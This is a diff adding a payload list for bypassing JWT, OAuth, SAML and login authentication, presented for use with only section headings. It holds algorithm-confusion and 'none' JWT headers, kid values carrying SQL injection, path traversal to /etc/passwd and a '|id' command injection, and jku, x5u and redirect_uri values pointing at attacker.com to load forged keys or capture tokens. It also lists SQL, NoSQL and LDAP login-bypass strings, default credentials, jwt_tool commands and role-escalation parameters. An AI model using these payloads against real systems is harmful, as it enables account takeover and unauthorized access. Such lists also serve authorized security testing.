@@ -1,0 +1,351 @@
+# JWT/OAuth/Authentication Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: JWT, OAuth, Authentication Bypass
+
+# ============================================
+# JWT NONE ALGORITHM
+# ============================================
+
+# Header with "none"
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+{"alg":"noNe","typ":"JWT"}
+{"alg":"nONE","typ":"JWT"}
+
+# ============================================
+# JWT HS256 HMAC BYPASS
+# ============================================
+
+# Change algorithm to HS256 and sign with public key
+{"alg":"HS256","typ":"JWT"}
+
+# Using empty key
+(leave secret empty)
+
+# Using known public key as secret
+-----BEGIN PUBLIC KEY-----
+[MARKUP_TRUNCATED]
+-----END PUBLIC KEY-----
+
+# Using "algorithm confusion" - RS256 -> HS256
+
+# ============================================
+# JWT ALGORITHM CONFUSION
+# ============================================
+
+# Change RS256 to HS256
+{"alg":"HS256","typ":"JWT"}
+
+# Use the public key as the HMAC secret
+
+# ============================================
+# JWT KEY CONFUSION
+# ============================================
+
+# Force RSA to HMAC
+# 1. Get public key
+# 2. Change alg to HS256
+# 3. Sign with public key
+
+# ============================================
+# JWT ALGORITHM TAMPERING
+# ============================================
+
+{"alg":"HS384","typ":"JWT"}
+{"alg":"HS512","typ":"JWT"}
+{"alg":"RS384","typ":"JWT"}
+{"alg":"RS512","typ":"JWT"}
+{"alg":"ES384","typ":"JWT"}
+{"alg":"ES512","typ":"JWT"}
+{"alg":"PS384","typ":"JWT"}
+{"alg":"PS512","typ":"JWT"}
+
+# ============================================
+# JWT KID MANIPULATION
+# ============================================
+
+# SQL Injection in kid
+{"alg":"RS256","typ":"JWT","kid":"1' OR '1'='1"}
+
+# Path traversal
+{"alg":"RS256","typ":"JWT","kid":"/etc/passwd"}
+{"alg":"RS256","typ":"JWT","kid":"../../etc/passwd"}
+
+# Command injection
+{"alg":"RS256","typ":"JWT","kid":"|id"}
+
+# ============================================
+# JWT JWK INJECTION
+# ============================================
+
+{"alg":"RS256","typ":"JWT","jwk":{"kty":"oct","k":"","kid":"test"}}
+{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"","e":"","kid":"test"}}
+
+# ============================================
+# JWT X5U/X5C INJECTION
+# ============================================
+
+{"alg":"RS256","typ":"JWT","x5u":"http://attacker.com/cert.pem"}
+{"alg":"RS256","typ":"JWT","x5c":["MIIE..."]}
+
+# ============================================
+# JWT TAMPERING - EXPIRED TOKEN
+# ============================================
+
+# Modify exp/nbf/iat
+{"exp":9999999999}
+{"nbf":0}
+{"iat":0}
+
+# Remove exp claim
+(remove "exp" from payload)
+
+# ============================================
+# JWT BLIND SIGNATURE
+# ============================================
+
+# Use jku parameter
+{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/jwks.json"}
+
+# JWKS content:
+# {"keys":[{"kty":"RSA","n":"","e":"","kid":"test","use":"sig","alg":"RS256"}]}
+
+# ============================================
+# OAUTH 2.0 BYPASS
+# ============================================
+
+# Redirect URI manipulation
+http://localhost
+http://localhost:3000
+http://127.0.0.1
+http://127.0.0.1:3000
+http://[::1]
+http://0.0.0.0
+http://example.com.attacker.com
+
+# CSRF on OAuth
+# State parameter removal
+(state=)
+
+# Scope escalation
+# Add additional scopes
+scope=read write admin
+
+# ============================================
+# AUTH BYPASS - SQL INJECTION
+# ============================================
+
+admin'--
+admin' #
+admin'/*
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'#
+' or '1'='1'/*
+') or '1'='1--
+') or ('1'='1--
+
+# ============================================
+# AUTH BYPASS - NO SQL INJECTION
+# ============================================
+
+# MongoDB
+admin' || '1'=='1
+admin' || 1==1 //
+admin' //
+{"$ne": null}
+{"$regex": ".*"}
+{"$gt": ""}
+
+# ============================================
+# AUTH BYPASS - LDAP
+# ============================================
+
+*)(uid=*))(|(uid=*
+*)(objectClass=*)
+admin)(&(password=*)
+*)(uid=*))(|(uid=*
+
+# ============================================
+# BASIC AUTH BYPASS
+# ============================================
+
+Authorization: Basic YWRtaW46YWRtaW4=
+# admin:admin
+
+Authorization: Basic YWRtaW46
+# admin:
+
+Authorization: BasicOg==
+# :
+
+Authorization: Basic Y29tLmFjY2U6cGFzc3dvcmQ=
+# com.ace:password
+
+# ============================================
+# BEARER TOKEN MANIPULATION
+# ============================================
+
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.signature
+
+Authorization: Bearer
+Authorization: Bearer null
+Authorization: Bearer ""
+Authorization: Bearer 'OR'1'='1
+
+# ============================================
+# SESSION FIXATION
+# ============================================
+
+# Set session ID before login
+Cookie: PHPSESSID=attacker-controlled-session-id
+
+# ============================================
+# CREDENTIAL STUFFING
+# ============================================
+
+# Common credential pairs
+admin:admin
+admin:password
+admin:123456
+root:root
+root:password
+user:user
+test:test
+guest:guest
+administrator:administrator
+
+# ============================================
+# JWT TOOLKIT
+# ============================================
+
+# Using jwt_tool
+python jwt_tool.py <JWT> -T
+python jwt_tool.py <JWT> -X a
+python jwt_tool.py <JWT> -S hs256 -p "<public_key>"
+
+# ============================================
+# OAUTH - GRANT TYPE
+# ============================================
+
+grant_type=client_credentials
+grant_type=password
+grant_type=authorization_code
+
+# ============================================
+# OAUTH - RESPONSE TYPE
+# ============================================
+
+response_type=token
+response_type=code
+response_type=id_token
+response_type=code token
+response_type=token id_token
+
+# ============================================
+# SAML BYPASS
+# ============================================
+
+# XML Signature Wrapping
+# Change assertion ID
+# Remove signature
+
+# ============================================
+# SAML - RELAX NG BYPASS
+# ============================================
+
+# XML entity injection
+
+# ============================================
+# AUTH - HORIZONTAL PRIVILEGE ESCALATION
+# ============================================
+
+# Change user_id in request
+user_id=1234
+user_id=1235
+id=1234
+uuid=1234
+
+# ============================================
+# AUTH - VERTICAL PRIVILEGE ESCALATION
+# ============================================
+
+# Change role parameter
+role=admin
+role=administrator
+role=root
+is_admin=true
+is_admin=1
+isAdmin=true
+
+# ============================================
+# JWT - KID NULL
+# ============================================
+
+{"alg":"HS256","typ":"JWT","kid":""}
+{"alg":"HS256","typ":"JWT","kid":null}
+{"alg":"HS256","typ":"JWT","kid":0}
+{"alg":"HS256","typ":"JWT","kid":"test"}
+
+# ============================================
+# JWT - X5C CHAIN
+# ============================================
+
+{"alg":"RS256","typ":"JWT","x5c":["<cert1>","<cert2>","<attacker_cert>"]}
+
+# ============================================
+# OAUTH - STATE BYPASS
+# ============================================
+
+state=
+state=null
+state=0000
+state=a
+
+# ============================================
+# OAUTH - REDIRECT URI
+# ============================================
+
+redirect_uri=http://localhost
+redirect_uri=http://localhost:8080
+redirect_uri=http://127.0.0.1
+redirect_uri=http://127.0.0.1:3000
+redirect_uri=http://example.com/../attacker.com
+redirect_uri=//attacker.com/
+redirect_uri=\\attacker.com
+redirect_uri=http://attacker.com
+redirect_uri=https://attacker.com
+
+# ============================================
+# SAML - ASSERTION INJECTION
+# ============================================
+
+<saml:Assertion>
+<saml:AttributeStatement>
+<saml:Attribute Name="role">
+<saml:AttributeValue>admin</saml:AttributeValue>
+</saml:Attribute>
+</saml:AttributeStatement>
+</saml:Assertion>
+
+# ============================================
+# JWT - TIME MANIPULATION
+# ============================================
+
+{"exp":0}
+{"exp":-1}
+{"exp":9999999999}
+{"iat":0}
+{"nbf":0}
+
+# ============================================
+# OAUTH - CLIENT SECRET
+# ============================================
+
+client_secret=
+client_secret=null
+client_secret=dummy
+client_secret=123456
+
